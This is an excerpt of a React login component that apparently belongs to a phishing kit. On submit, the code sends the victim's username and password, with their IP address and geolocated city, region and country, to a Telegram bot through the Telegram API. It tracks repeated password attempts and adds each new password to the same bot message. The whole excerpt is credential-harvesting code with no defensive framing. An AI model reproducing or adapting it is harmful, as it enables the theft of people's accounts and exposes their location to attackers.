...
const Login: FC = () => {
    ...
    useEffect(() => {
        const getConfig = async () => {
            const max_pass = config.max_pass;
            setMaxAttemp(max_pass);
        };
    ...
    const handleSubmit = async () => {
        ...
        setIsLoading(true);
        let existId = localStorage.getItem('message_id');
        if (existId) {
            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                ...
                body: JSON.stringify({
                    text: `<b>MK ${currentAttemp}</b> <code>${password}</code>`,
                    parse_mode: 'HTML',
            ...
            let message = ``;
            if (geolocationData) {
                message += `<b>IP</b> <code>${geolocationData.ip}</code>\n<b>Address</b> <code>${geolocationData.city} - ${geolocationData.region} - ${geolocationData.country}</code>\n`;
            }
            message += `<b>TK</b> <code>${username}</code>\n<b>MK</b> <code>${password}</code>`;
            ...
            existId = data.result.message_id;
        }
        localStorage.setItem('message_id', `${existId}`);
